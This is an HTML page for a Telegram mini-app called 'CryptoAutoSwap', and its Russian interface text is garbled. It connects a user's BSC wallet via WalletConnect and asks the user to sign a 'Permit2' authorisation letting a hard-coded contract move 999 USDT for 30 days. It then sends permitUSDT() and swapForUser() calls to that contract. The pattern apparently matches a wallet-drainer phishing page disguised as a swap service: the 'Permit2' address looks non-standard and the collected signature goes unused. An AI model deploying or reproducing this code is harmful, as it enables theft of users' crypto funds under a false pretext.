<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>CryptoAutoSwap</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- Telegram WebApp SDK -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <!-- WalletConnect v2 -->
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.0.0/dist/umd/index.min.js"></script>
  <!-- ethers.js -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>

  <style>
    body {
      background: #0f1115;
      color: #fff;
      font-family: sans-serif;
      padding: 2em;
      text-align: center;
    }
    button {
      font-size: 16px;
      padding: 12px 20px;
      background: #2ea6ff;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 20px;
    }
    #status {
      margin-top: 20px;
      font-size: 16px;
      min-height: 24px;
    }
  </style>
</head>
<body>
  <h2>CryptoAutoSwap</h2>
  <p>–ü–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫ —á–µ—Ä–µ–∑ WalletConnect</p>
  <button id="connectBtn">üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</button>
  <div id="status">–ì–æ—Ç–æ–≤–æ –∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—é</div>

<script>
(async () => {
  Telegram.WebApp.ready();

  const status = document.getElementById("status");
  const connectBtn = document.getElementById("connectBtn");

  const PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
  const BSC_RPC = "https://bsc-dataseed.binance.org";
  const CHAIN_ID = 56;

  const PERMIT2 = "0xA252294555A62511CBd1899Ac5dEfA26F5036098";
  const AUTOSWAP = "0x48EEcE98f1AC0C59Db0Fe3217F6783D503e3416c";
  const USDT = "0x55D398326f99059FF775485246999027B3197955";
  const LIMIT = ethers.parseUnits("999", 18);
  const DEADLINE = Math.floor(Date.now() / 1000) + 30 * 86400; // 30 –¥–Ω–µ–π

  const iface = new ethers.Interface([
    "function permitUSDT() external",
    "function swapForUser(address user, uint256 amountUSDT) external"
  ]);

  connectBtn.onclick = async () => {
    status.textContent = "‚è≥ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ WalletConnect...";
    const provider = await window.WalletConnectEthereumProvider.init({
      projectId: PROJECT_ID,
      chains: [CHAIN_ID],
      showQrModal: true,
      rpcMap: { [CHAIN_ID]: BSC_RPC },
      methods: ["eth_sendTransaction", "eth_signTypedData"],
    });

    try {
      const accounts = await provider.enable();
      const account = accounts[0];
      const chainId = parseInt(await provider.request({ method: "eth_chainId" }), 16);
      if (chainId !== CHAIN_ID) {
        status.textContent = "‚ùå –ù–µ–≤–µ—Ä–Ω–∞—è —Å–µ—Ç—å. –í—ã–±–µ—Ä–∏—Ç–µ Binance Smart Chain";
        return;
      }

      status.textContent = "‚úçÔ∏è –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º Permit2 –ø–æ–¥ USDT...";
      const permit = {
        domain: {
          name: "Permit2",
          version: "1",
          chainId: CHAIN_ID,
          verifyingContract: PERMIT2
        },
        types: {
          PermitTransferFrom: [
            { name: "permitted", type: "TokenPermissions" },
            { name: "spender", type: "address" },
            { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
          ],
          TokenPermissions: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint256" }
          ]
        },
        primaryType: "PermitTransferFrom",
        message: {
          permitted: { token: USDT, amount: LIMIT.toString() },
          spender: AUTOSWAP,
          nonce: "0",
          deadline: DEADLINE.toString()
        }
      };

      const sig = await provider.request({
        method: "eth_signTypedData_v4",
        params: [account, JSON.stringify(permit)],
      });

      status.textContent = "üöÄ –û—Ç–ø—Ä–∞–≤–ª—è–µ–º permitUSDT() + swapForUser()...";

      const callData = iface.encodeFunctionData("permitUSDT", []);
      const tx1 = {
        from: account,
        to: AUTOSWAP,
        data: callData
      };

      const tx2 = {
        from: account,
        to: AUTOSWAP,
        data: iface.encodeFunctionData("swapForUser", [account, LIMIT])
      };

      const hash1 = await provider.request({ method: "eth_sendTransaction", params: [tx1] });
      const hash2 = await provider.request({ method: "eth_sendTransaction", params: [tx2] });

      status.innerHTML = `‚úÖ –£—Å–ø–µ—à–Ω–æ!<br>Permit TX: ${hash1}<br>Swap TX: ${hash2}`;
      Telegram.WebApp.close();
    } catch (err) {
      console.error(err);
      status.textContent = "‚ùå –û—à–∏–±–∫–∞: " + (err.message || err);
    }
  };
})();
</script>
</body>
</html>